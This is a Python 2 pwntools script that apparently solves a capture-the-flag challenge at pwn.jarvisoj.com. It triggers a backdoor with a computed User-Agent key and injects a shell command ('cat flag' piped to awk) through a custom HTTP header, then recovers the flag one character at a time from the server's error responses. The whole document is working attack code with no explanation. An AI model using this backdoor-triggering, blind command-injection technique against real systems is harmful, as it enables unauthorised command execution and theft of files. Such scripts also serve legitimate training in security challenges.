from pwn import *
import os

f = ""

for p in range(40):
    for char in string.printable:
        command = "cat flag|awk '{if(substr($1,%d,1)==\"%s\") print \"%s\"}'" % (p+1, char, "A")
        Io = remote("pwn.jarvisoj.com",9881)
        key = "2016CCRT"
        flag = ""
        for i in range(len(key)):
            flag += chr(ord(key[i])^i)
        payload = ""
        payload += "GET / HTTP/1.1\r\n"
        payload += "User-Agent: "+flag+"\r\n"
        payload += "back: %s\r\n"%command
        payload += "\r\n\r\n"
        Io.send(payload)
        x = Io.read()
        Io.close()
        os.system("clear")
        print "flag="+f
        if "500" in x:
            continue
        f += char
print "flag=" + f